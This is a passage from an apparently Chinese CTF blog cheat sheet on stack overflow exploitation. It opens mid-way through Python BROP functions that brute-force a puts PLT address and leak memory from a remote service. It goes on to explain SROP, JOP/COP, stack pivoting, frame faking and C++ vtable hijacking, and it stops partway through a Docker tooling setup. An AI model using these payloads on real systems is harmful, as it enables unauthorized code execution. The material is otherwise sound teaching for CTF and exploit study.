class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_plt</span>(<span class="params">plt_addr, buf_length, pop_rdi_ret, stop_gadgets, canary=<span class="literal">None</span></span>):</span><br><span class="line">    addr = plt_addr  <span class="comment"># plt address</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(<span class="number">0x400000</span>)  <span class="comment"># # ELF start address</span></span><br><span class="line">    payload += <span class="string">&#x27;%s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += p64(stop_gadgets)  <span class="comment"># Stop gadgets addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 Traps.</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote()</span><br><span class="line">            output = conn_send_recv(conn, payload % p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">if</span> output.startswith(<span class="string">&#x27;\x7fELF&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[!] Crash found! Maybe invalid plt address. continue finding...&#x27;</span>)</span><br><span class="line">        addr += <span class="number">16</span></span><br></pre></td></tr></table></figure><p>最后就是调用 puts 打印各种地址内存了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">addr, puts_plt, buf_length, pop_rdi_ret, stop_gadgets, canary=<span class="literal">None</span></span>):</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(stop_gadgets)</span><br><span class="line">       data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = get_remote()</span><br><span class="line">        data = conn_send_recv(conn, payload)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        conn.close()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>SROP 即 Sigreturn-Oriented Programming（面向 Sigreturn 编程），sigreturn 是一个系统调用，当 unix 系统发生 signal 的时候会被间接调用。</p><p>当内核向一个进程发送一个 signal 的时候，该进程会被暂时挂起，然后进入内核态，在进入内核态之前，内核会将进程的上下文保存在栈中，这个上下文被称为 ucontext，其中包含了当前所有寄存器的值，之后将 signal 信息也就是 siginfo 压入栈中，然后将指向 sigreturn 系统调用的地址压入栈中，这样内核态执行完毕以后就可以执行 sigreurn 系统调用恢复保存在栈中的进程所有寄存器的值，其中，ucontext 以及 siginfo 被称为 Signal Frame。32 位 sigreturn 的调用号位 77，64 位 sigreturn 的调用号位 15。</p><p>32 位系统下的 Signal Frame 结构如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>64 位系统下的 Signal Frame 结构如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于整个 Signal Frame 都被保存在栈中，因此通过栈溢出我们可以读写对应的 Signal Frame，这时内核态执行完毕以后调用 sigreturn 恢复进程寄存器的时候，我们就可以控制 rip/eip 的值，劫持控制流，我们也可以手动调用 sigreturn 系统调用，然后在栈上伪造一个 Signal Frame，这样就可以控制所有寄存器的值。我们甚至可以伪造多个不同的 Signal Frame 执行不同的系统调用或函数，例如这个 Frame 可以调用 read，另一个调用 write 等等。</p><p>实际上 pwntools 中已经集成了针对 SROP 的利用<code>SigreturnFrame()</code>，直接实例化一个这个类就可以很容易修改 Signal Frame 中寄存器的值，修改完成后将其转为 str 就得到了对应的 payload，直接 send 即可，非常方便。</p><h2 id="JOP"><a href="#JOP" class="headerlink" title="JOP"></a>JOP</h2><p>JOP 即 Jump-Oriented Programming（面向跳转编程），说白了就是只用 jmp 寄存器完成 getshell，例如<code>pop rax; jmp rax</code>，大致原理与 ROP 相同。</p><h2 id="COP"><a href="#COP" class="headerlink" title="COP"></a>COP</h2><p>COP 即 Call-Oriented Programming（面向调用编程），说白了就是只用 call 寄存器完成 getshell，例如<code>pop rax; call rax</code>，大致原理与 ROP 相同。</p><h2 id="Stack-Pivoting"><a href="#Stack-Pivoting" class="headerlink" title="Stack Pivoting"></a>Stack Pivoting</h2><p>也称作栈迁移，如果可以控制栈顶指针 sp，就可以将栈迁移到其他可读写的地址，通常情况下我们虽然可以很容易控制 sp，但是其他方法就可以 getshell，所以一般用不到栈迁移，但是在某些极端情况下栈迁移也是非常有用的：</p><ol><li>可以溢出的长度很少，无法构造较长的 rop 链</li><li>开启了 PIE，我们不知道栈地址，可以控制 sp 的话就可以将栈迁移到已知地址</li><li>甚至可以将栈迁移到堆空间结合堆溢出控制栈上的内容</li></ol><p>攻击前提：</p><ol><li>可以劫持控制流</li><li>可以控制栈顶指针 sp，例如 <code>pop rsp; ret</code> 这类的 gadgets。其实万金油 csu 中就有现成的可以控制 sp 的 gadget，位置在偏移 +3 处。</li></ol><h2 id="Frame-Faking"><a href="#Frame-Faking" class="headerlink" title="Frame Faking"></a>Frame Faking</h2><p>顾名思义，伪造一个函数栈劫持控制流，其实和栈迁移一样，只不过是将栈底迁移到已知的可控地址处，利用<code>leave; ret</code>gadgets 来劫持控制流，即如果栈底可控，那么通过 leave 指令，栈顶也就可控，ret 也可控。</p><p>leave 指令相当于 <code>move esp,ebp; pop ebp</code>，也就是<code>esp=ebp &amp;&amp; ebp=old_ebp</code>，如果我们可以通过栈溢出修改<code>old_ebp</code> 为我们可控的地址<code>evil_ebp</code>，那么在执行 leave 的时候首先修改 esp 为 ebp，之后修改 ebp 为我们的<code>evil_ebp</code>，现在栈底我们可控，之后执行 ret 指令，也就是<code>leave; ret</code>gadget，这时又会执行一次 leave，esp 就变成了我们的<code>evil_ebp</code>，那么这时候整个栈顶和栈底都到了我们可控的地址处，这时又修改 ebp 到其他地方（可以是我们控制的地方，不过已经无所谓了），然后执行 gadget 中的 ret 指令 ，但是这时整个栈都到了我们可控的地址处，也就是说我们可以任意控制栈上的内容，可以很容易构造其他 rop 链了。</p><p>其实说白了，栈伪造就是栈迁移的升级版，其利用范围和栈迁移一样，但是攻击前提就需要寻找到一条 <code>levae; ret</code> 这样的 gadget，其实这种 gadget 很好找。栈伪造的原理如下所示，假设 0x0 开始是程序原本的栈，但是通过栈溢出我们只能修改 ebp 和 ret，这时无法构造长的 rop 链，但是我们修改 ebp 为 0x800010，也就是我们伪造的栈地址，修改 ret 为 0x400070，也就是<code>leave; ret</code>gadget，执行完以后<code>leave; ret</code>gadget 以后栈就会被迁移到 0x800010 处，这时我们就可以完全控制栈的内容了，可以构造任意长度的 rop 链。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x0 AAAA</span><br><span class="line">0x4 AAAA</span><br><span class="line">0x8 old_ebp (=0x80001a)</span><br><span class="line">0xc ret (=0x40075)</span><br><span class="line">...</span><br><span class="line">0x400070 leave; ret</span><br><span class="line">...</span><br><span class="line">0x800010 AAAA</span><br><span class="line">0x800014 gadgets_addr</span><br><span class="line">0x800018 gadgets_addr</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="Other-Tricks"><a href="#Other-Tricks" class="headerlink" title="Other Tricks"></a>Other Tricks</h2><ol><li><p>控制 rax/eax</p><p> 有时候系统调用需要我们控制 al 寄存器，但是类似 <code>pop rax/eax; ret</code> 这种 gadgets 很难找，这时若可以调用 alarm 函数，那么可以通过依次调用 alarm(x)，alarm(0)即可将 rax 设置为 x，而很多题目都会设置一个 alarm 定时终止程序防止过多的 socket 连接占用资源。其实不止 alarm，其他函数在调用完成后也可能会修改部分寄存器的值。</p></li><li><p>栈重叠</p><p> 对于两个连续调用的函数，第一个函数执行完成后其栈桢被回收（即 esp=ebp），但是被回收的栈上保存的内容并不会被清空，这时开始执行第二个函数，开辟新的栈桢，第二个函数开辟的栈桢中某些未初始化的局部变量的默认值可能会受到第一个函数中未被清空的局部变量的影响</p></li></ol><h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><p>对于 C++ 的 pwn 大都针对于虚函数。C++ 支持多态与虚函数，基类的虚函数仅负责给出函数的定义，而该函数的具体实现由子类决定。由于在编译期间无法确定具体对象所调用的虚函数，因此 C++ 主要通过动态绑定的方法实现了虚函数，即在程序运行过程中根据对象的实际类型决定调用哪个虚函数。简而言之，虚函数的目的就是为了通过一个基类指针可以调用子类的同名函数，而这一功能在编译期间无法实现，主要通过虚表进行延迟绑定实现。</p><p>每个包含虚函数的类都会有一个虚表（vtable），该类的所有对象共用一个虚表，虚表其实是一个指针数组，数组中每个元素都是一个指向一个虚函数的指针。虚表一般位于.rodata 段中，位于类的定义数据的起始位置，只读不可写。在程序编译的时候虚表内容就已经确定。若一个子类继承了包含虚函数的类，该子类也有一个虚表，虚表中的指针会指向其继承树中最近的一个类的虚函数。类的每一个对象都保存一个指向该对象所属类的虚表的指针__vptr，当调用一个对象的虚函数的时候，通过该对象的虚表指针找到该类的虚表，之后在虚表中找到对应的函数地址并且调用。</p><p>假设有如下继承关系。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;A::vfunc1()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;A::vfunc2()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;A::func1()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;A::func2()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_data1, m_data2;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>: <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;B::vfunc1()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;B::func1()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_data3;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>: <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;C::vfunc2()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">()</span></span>&#123;cout&lt;&lt;<span class="string">&quot;C::func2()&quot;</span>&lt;&lt;endl;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_data1, m_data4;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    B b;</span><br><span class="line">    C c;</span><br><span class="line">    A *p;</span><br><span class="line">    </span><br><span class="line">    p = &amp;b;</span><br><span class="line">    p-&gt;<span class="built_in">func1</span>();  <span class="comment">// A::func1()</span></span><br><span class="line">    p-&gt;<span class="built_in">func2</span>();  <span class="comment">// A::func2()</span></span><br><span class="line">    p-&gt;<span class="built_in">vfunc1</span>();  <span class="comment">// B::vfunc1()</span></span><br><span class="line">    p-&gt;<span class="built_in">vfunc2</span>();  <span class="comment">// A::vfunc2()</span></span><br><span class="line">    cout &lt;&lt; endl; </span><br><span class="line">    </span><br><span class="line">    p = &amp;c;</span><br><span class="line">    p-&gt;<span class="built_in">func1</span>();  <span class="comment">// A::func1()</span></span><br><span class="line">    p-&gt;<span class="built_in">func2</span>();  <span class="comment">// A::func2()</span></span><br><span class="line">    p-&gt;<span class="built_in">vfunc1</span>();  <span class="comment">// B::vfun1()</span></span><br><span class="line">    p-&gt;<span class="built_in">vfunc2</span>();  <span class="comment">// C::vfun2()</span></span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>p 是一个 A 类的指针，p 首先指向 B 的对象 b，此时 <code>b-&gt;__vptr</code> 指向 B 的虚表，在虚表中查询对应函数地址即可找到真正调用的函数。内存中 A，B，C 三个类的虚表如下所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/10.png"></p><p>针对 C++ 的 pwn 基本都是劫持虚表，但是虚表本身不可写，所以可以劫持一个对象指向虚表的虚表指针。目前有两种主要的攻击手法：伪造虚表，让类的虚表指针指向伪造的一个虚表，或者修改虚表指针指向其他类的虚表。</p><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>建议使用 Docker 搭建本地环境，方便调试程序，本人使用的 docker 环境的 dockerfile 如下(Ubuntu 18.04)，其中包含了后文中的大部分离线工具 </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="variable">$TZ</span> &gt; /etc/timezone &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y ca-certificates</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> sources.list /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> pip.conf /root/.pip/pip.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> dpkg --add-architecture i386 &amp;&amp; apt-get -y update &amp;&amp; apt install -y \</span></span><br><span class="line"><span class="language-bash">    zsh \</span></span><br><span class="line"><span class="language-bash">    seccomp \</span></span><br><span class="line"><span class="language-bash">    libseccomp-dev \</span></span><br><span class="line"><span class="language-bash">    libc6:i386 \</span></span><br><span class="line"><span class="language-bash">    libc6-dbg:i386 \</span></span><br><span class="line"><span class="language-bash">    libc6-dbg \</span></span><br><span class="line"><span class="language-bash">    lib32stdc++6 \</span></span><br><span class="line"><span class="language-bash">    g++-multilib \</span></span><br><span class="line"><span class="language-bash">    cmake \</span></span><br><span class="line"><span class="language-bash">    ipython3 \</span></span><br><span class="line"><span class="language-bash">    upx-ucl \</span></span><br><span class="line"><span class="language-bash">    vim \</span></span><br><span class="line"><span class="language-bash">    net-tools \</span></span><br><span class="line"><span class="language-bash">    iputils-ping \</span></span><br><span class="line"><span class="language-bash">    libffi-dev \</span></span><br><span class="line"><span class="language-bash">    libssl-dev \</span></span><br><span class="line"><span class="language-bash">    python3-dev \</span></span><br><span class="line"><span class="language-bash">    python3-pip \</span></span><br><span class="line"><span class="language-bash">    python-pip \</span></span><br><span class="line"><span class="language-bash">    build-essential \</span></span><br><span class="line"><span class="language-bash">    ruby \</span></span><br><span class="line"><span class="language-bash">    ruby-dev \</span></span><br><span class="line"><span class="language-bash">    tmux \</span></span><br><span class="line"><span class="language-bash">    strace \</span></span><br><span class="line"><span class="language-bash">    ltrace \</span></span><br><span class="line"><span class="language-bash">    nasm \</span></span><br><span class="line"><span class="language-bash">    wget \</span></span><br><span class="line"><span class="language-bash">    radare2 \</span></span><br><span class="line"><span class="language-bash">    gdb \</span></span><br><span class="line"><span class="language-bash">    gdb-multiarch \</span></span><br><span class="line"><span class="language-bash">    netcat \</span></span><br><span class="line"><span class="language-bash">    socat \</span></span><br><span class="line"><span class="language-bash">    python3-distutils \</span></span><br><span class="line"><span class="language-bash">    git \</span></span><br><span class="line"><span class="language-bash">    binwalk \</span></span><br><span class="line"><span class="language-bash">    patchelf \</span></span><br><span class="line"><span class="language-bash">    gawk \</span></span><br><span class="line"><span 